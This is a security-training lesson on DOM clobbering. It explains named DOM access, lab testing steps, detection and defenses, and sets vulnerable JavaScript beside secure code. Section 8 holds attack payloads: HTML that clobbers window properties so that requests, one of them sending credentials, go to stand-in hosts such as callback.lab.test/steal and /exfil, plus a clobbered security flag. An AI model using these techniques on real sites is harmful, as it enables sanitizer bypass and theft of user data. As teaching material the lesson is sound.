---
schema_version: 1
id: WEB-A05-DOM-CLOBBERING
title: "DOM Clobbering"
slug: dom-clobbering
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-79
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# DOM Clobbering

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain DOM Clobbering by root cause instead of just describing the consequence.
- Identify the trust boundary, asset, actor, and necessary conditions for the vulnerability to be exploited.
- Conduct controlled testing in a local lab and distinguish expected results from false positives.
- Choose root controls, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Grasp the HTTP request/response flow of the DOM Clobbering scenario and how to apply input handling across trust boundaries. 
- Differentiate authentication, authorization, and validation.
- Be able to read code/configuration in the language or framework appearing in the example.
- Have an isolated local lab, synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

HTML defines specific named access algorithms for `Window` and some collections/forms. Not every element with `id`/`name` becomes the same type of property on both `window` and `document`; the result also depends on the type of element, duplicate names, and the standard's algorithm. [S4]

Named access can make an element carrying `id` or `name` appear as an attribute on `window` or `document`, depending on the algorithm defined by HTML. Some linked elements also represent URL when converted to a string. Therefore, application code must not use named properties from DOM as a trusted configuration source; specific HTML input to verify this behavior is in section 8. [S4]

## 4. Description and Root Cause

The DOM Clobbering vulnerability occurs when an application allows untrusted HTML to create a named property that conflicts with a configuration name being read by JavaScript. Simply removing the script element does not resolve the root cause: the code still retrieves a value inherited from DOM instead of a configuration object owned by the application. The impact can only be concluded after demonstrating the presence of a gadget that consumes the clobbered value; not every name collision leads to XSS or a redirect. [S1] [S2]

> **Reference:** Technical claims in the lesson are marked with source markers; when applying in practice, refer to the version/framework being used: [S1], [S2], [S3], [S4], [S5].

## 5. Threat Model and Exploitation Conditions

- **Assets:** client-side configuration values and DOM property lookup mechanism.  
- **Actor, authentication, and role:** user can insert HTML limited; victim opens fixture with user role.  
- **Exploitation conditions:** named DOM accesses actor's element variable into a value that the code trusts as configuration.  
- **Browser, proxy, framework, and version:** Chromium pinned on .lab.test with static JavaScript fixture and no outbound; must record actual image/package version along with evidence.  
- **Mandatory evidence:** along with ID correlation, must link input, control decisions, and impact the correct asset; individual status code is not enough. [S1]

## 6. Attack Mechanism

For DOM clobbering, named DOM accesses the actor's element variable to a value that the code believes is configuration. The positive case must prove that the input reaches the correct sink and creates the described effect; the negative case, when origin control is enabled, must be blocked before any side effect. The conclusion only applies to the environment pinned in item 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch Chromium pinned on .lab.test with static JavaScript fixture and no outbound; only load synthetic data, enable app/proxy/datastore logging, and attach correlation ID.
2. **Baseline:** send a valid input for the dom clobbering use case; record raw request/response, determine policy, and asset state before the test.
3. **Input and actions:** use exactly one core payload from section 8 in the annotated context; change one variable at a time and comply with request cap.
4. **Expected result:** only consider the vulnerable fixture as positive when logs demonstrate the “named DOM access of actor’s element variable to a value that code believes is configuration” mechanism; secure fixture must block before side effects and boundary input must fail closed.
5. **Cleanup:** delete dom clobbering data, markers, and logs; revoke related session/cache, revert snapshot, and confirm no test callbacks/processes remain.
6. **Safety limits:** only run on loopback/`.lab.test`; do not use real targets, credentials, or data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The probes below only apply when the named access results are rerun in the pinned version of Chromium. [S2] [S4]

**Scenario 1 — Simple configuration variable override:**

<!-- claim-source: [S1] [S4] -->
<!-- payload-id: WEB-A05-DOM-CLOBBERING-001 -->
<!-- context: HTML fragment inserted before application startup in pinned Chromium -->
<!-- prerequisites: callback.lab.test resolves to loopback; sanitizer permits a/id/href; no credentials or outbound network -->
<!-- encoding: UTF-8 HTML parsed in body context; href is an absolute .lab.test URL -->
<!-- expected-result: window.configUrl resolves to the anchor in vulnerable page; secure lexical config remains unchanged -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
<!-- Attacker injects this HTML (passes sanitizer since no script tags) -->
<a id="configUrl" href="https://callback.lab.test/steal">Click</a>
```

<!-- claim-source: [S1] [S4] -->
<!-- payload-id: WEB-A05-DOM-CLOBBERING-002 -->
<!-- context: JavaScript reads window.configUrl after WEB-A05-DOM-CLOBBERING-001 is inserted -->
<!-- prerequisites: both endpoints resolve locally; fetch is intercepted; synthetic cookie omitted; one execution -->
<!-- encoding: ECMAScript UTF-8 source; DOM anchor stringification yields its absolute href without extra decoding -->
<!-- expected-result: intercepted fetch targets callback.lab.test only in vulnerable case; secure code uses the fixed API URL -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```javascript
// Vulnerable application code
// Developer expects configUrl to be a string variable
let endpoint = window.configUrl || "https://api.legit.lab.test/data";

// After clobbering: endpoint = "https://callback.lab.test/steal"
// because <a>.toString() returns href value
fetch(endpoint, { credentials: "include" });
```
**Scenario 2 — Clobbering nested properties with `<form>`:**

<!-- claim-source: [S2] [S4] -->
<!-- payload-id: WEB-A05-DOM-CLOBBERING-003 -->
<!-- context: HTML form/input named properties evaluated in pinned Chromium -->
<!-- prerequisites: .lab.test origins map to loopback; the exact form is inserted once before script execution -->
<!-- encoding: UTF-8 HTML in body context; input value is parsed as an attribute and exposed as a string -->
<!-- expected-result: window.config.url.value equals the synthetic exfil URL; schema-based config does not read the form -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
<!-- Clobber window.config.url using form + input -->
<form id="config" name="config">
  <input name="url" value="https://callback.lab.test/exfil">
</form>

<script>
  // window.config -> <form> element
  // window.config.url -> <input> element
  // window.config.url.value -> "https://callback.lab.test/exfil"
  console.log(window.config.url.value); // attacker-controlled
</script>
```
**Scenario 3 — Bypass sanitizer to achieve XSS:**

<!-- claim-source: [S2] [S4] -->
<!-- payload-id: WEB-A05-DOM-CLOBBERING-004 -->
<!-- context: HTML named element collides with a boolean security configuration lookup -->
<!-- prerequisites: pinned Chromium; synthetic page with no sensitive HTML; no network requests -->
<!-- encoding: UTF-8 HTML body fragment; id uses ASCII and requires no URL encoding -->
<!-- expected-result: vulnerable truthy check treats the HTMLDivElement as proof content was sanitized and reaches the marker sink; secure strict-typed config rejects the element -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
<!-- Clobber a security flag that guards innerHTML assignment -->
<div id="sanitizerEnabled"></div>
<!-- window.sanitizerEnabled is now truthy (DOM element), but not boolean true -->
<script>
  // Vulnerable code assumes a truthy flag means upstream sanitization already ran.
  if (window.sanitizerEnabled) {
    document.documentElement.dataset.clobberBranch = "trusted-without-type-check";
  }
</script>
```

## 9. Vulnerable Code and Secure Code

```javascript
// ❌ VULNERABLE: Global named-property lookup can be clobbered.
let url = window.analyticsEndpoint || "/api/analytics";
navigator.sendBeacon(url, JSON.stringify(userData));

// ✅ SECURE: Use local constant with type validation
const ANALYTICS_ENDPOINT = "/api/analytics";

function sendAnalytics(data) {
  // Hardcoded constant cannot be clobbered
  const url = ANALYTICS_ENDPOINT;

  // Additional URL validation
  if (!url.startsWith("/") && !url.startsWith("https://trusted.lab.test")) {
    throw new Error("Invalid analytics endpoint");
  }

  navigator.sendBeacon(url, JSON.stringify(data));
}
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to DOM Clobbering, the policy result, and ID correlation; do not log secrets or entire tokens. 
- Compare authorization/validation failures with a valid baseline and alert according to behavior chains, not just a single payload chain. 
- Combine application telemetry, reverse proxy, and datastore to confirm that the request reached the sink and whether or not there was impact. 
- Scanner or WAF alerts are only investigation signals; they are not sole evidence that the vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Keep security configuration in a lexical variable and check type/schema, do not read the named DOM property. 
- Apply the same controls to all routes, operations, and equivalent processing paths; failure must stop before side effects.

### Defense-in-depth

With DOM Clobbering, the following measures help reduce the blast radius or increase detection capability. Rate limiting, UUID unpredictability, WAF, CSP, or general validation should not be used as a substitute for origin controls.

- **Summary**: Avoid using global variables on the window object, use scoped variables, and apply Trusted Types. 
- **Detailed steps**:
  - Do not use global variables on `window` — use `const`/`let` in local scope or ES6 modules.
  - Sanitize and review DOM before insertion using libraries like DOMPurify.
  - Use Trusted Types to control sensitive insertion points (sinks); this mechanism does not replace keeping configuration outside named DOM properties. [S2] [S4]

## 12. Retest

- **Positive case:** with DOM Clobbering, valid flows still work correctly for the actor and allowed data.  
- **Negative case:** with the same input/resources, unauthorized actor or context should be denied without leaking sensitive details.  
- **Boundary case:** check empty values, extreme edge cases, different encodings, repeated requests, expired session states, and equivalent paths/operations.  
- **Telemetry:** verify policy decision, application log, proxy log, and datastore side effects match correlation ID.  
- **Recheck:** save minimal scenarios to reproduce old bugs and demonstrate that the fix does not rely on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of DOM Clobbering without confirming side effects and logs.  
- Use a syntactically correct payload but with the wrong DBMS, browser, framework, protocol, or injection context.  
- Consider UUID, rate limit, WAF, CSP, or general input validation as a fix for another root control.  
- Only fix one route while the same sink/policy is used on another route.  
- Conclude that a vulnerability exists without saving the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **DOM Clobbering**: Overwriting global JavaScript objects and variables through the HTML `id`/`name` property.
- **DOM (Document Object Model)**: A hierarchical document object model representing the content of a web page.
- **Named Access**: A mechanism to automatically access HTML elements via name/id attributes as a JavaScript variable.
- **Sanitizer**: A library or tool that cleans HTML to remove malicious code before putting it on the page.
- **Bypass**: The act of making a processing flow avoid or nullify an expected control; must be demonstrated with a specific gadget/side effect. [S1] [S2]

## 16. Related Lessons and Further Reading

- [DOM-based XSS](../xss/dom-based/) — XSS vulnerability based on DOM.

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/web-security/dom-based/dom-clobbering — version/status: current version; accessed: 2026-07-17. 
- **[S2]** OWASP DOM Clobbering Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html — version/status: current version; accessed: 2026-07-17. 
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/79.html — version/status: current version; accessed: 2026-07-17. 
- **[S4]** HTML Spec Named Access. https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object — version/status: current version; accessed: 2026-07-17. 
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.